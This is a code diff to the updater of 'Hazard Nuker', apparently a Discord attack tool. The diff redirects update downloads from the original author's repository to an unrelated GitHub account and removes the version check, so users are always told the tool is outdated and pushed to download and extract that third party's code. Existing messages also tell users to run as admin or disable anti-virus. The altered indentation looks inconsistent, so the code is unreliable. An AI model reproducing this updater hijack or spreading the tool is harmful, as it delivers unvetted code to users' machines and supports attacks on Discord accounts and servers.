@@ -12,27 +12,18 @@ from zipfile import ZipFile
 from time import sleep
 from bs4 import BeautifulSoup
 from colorama import Fore
-
+from util.plugins.common import clear, print_slow, setTitle, getheaders, THIS_VERSION
 from util.plugins.common import *
 
 def search_for_updates():
     clear()
     setTitle("Hazard Nuker Checking For Updates. . .")
-    r = requests.get("https://github.com/Rdimo/Hazard-Nuker/releases/latest")
-
-    soup = str(BeautifulSoup(r.text, 'html.parser'))
-    s1 = re.search('<title>', soup)
-    s2 = re.search('·', soup)
-    result_string = soup[s1.end():s2.start()]
-
-    if THIS_VERSION not in result_string:
-        soup = BeautifulSoup(requests.get("https://github.com/Rdimo/Hazard-Nuker/releases").text, 'html.parser')
-        for link in soup.find_all('a'):
+    soup = BeautifulSoup(requests.get("https://github.com/JaneHongEn/111/tree/Hazard-Nuker-main").text, 'html.parser')
+    for link in soup.find_all('a'):
             if "releases/download" in str(link):
                 update_url = f"https://github.com/{link.get('href')}"
-        new_version = requests.get(update_url)
-        setTitle("Hazard Nuker New Update Found!")
-        print(f'''{Fore.YELLOW}
+    setTitle("Hazard Nuker New Update Found!")
+    print(f'''{Fore.YELLOW}
                 ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                 ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                 ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
@@ -40,10 +31,10 @@ def search_for_updates():
                 ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                 ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                               {Fore.RED}Looks like this Hazard Nuker {THIS_VERSION} is outdated '''.replace('█', f'{Fore.WHITE}█{Fore.RED}'), end="\n\n")
-        choice = str(input(
+    choice = str(input(
             f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}You want to update to the latest version? (Y to update): {Fore.RED}'))
 
-        if choice.upper() == 'Y':
+    if choice.upper() == 'Y':
             print(f"{Fore.WHITE}\nUpdating. . .")
             setTitle(f'Hazard Nuker Updating...')
             #if they are running hazard.exe
@@ -70,7 +61,7 @@ def search_for_updates():
                     sleep(10)
             #if they are running hazard source code
             else:
-                new_version_soure = requests.get("https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip")
+                new_version_soure = requests.get("https://github.com/JaneHongEn/111/archive/refs/heads/Hazard-Nuker-main.zip")
                 with open("Hazard-Nuker-master.zip", 'wb')as zipfile:
                     zipfile.write(new_version_soure.content)
                 with ZipFile("Hazard-Nuker-master.zip", 'r') as filezip:
@@ -90,6 +81,6 @@ def search_for_updates():
                     print(f"{Fore.RED}\nHazard Nuker-{THIS_VERSION} doesn't have enough permission to update\ntry re-running again as admin or turn off anti-virus otherwise try and download it manually here {update_url}\n\n\"{err}\"")
                     sleep(10)
 
-        else:
-            input
-            return
+    else:
+        input
+        return
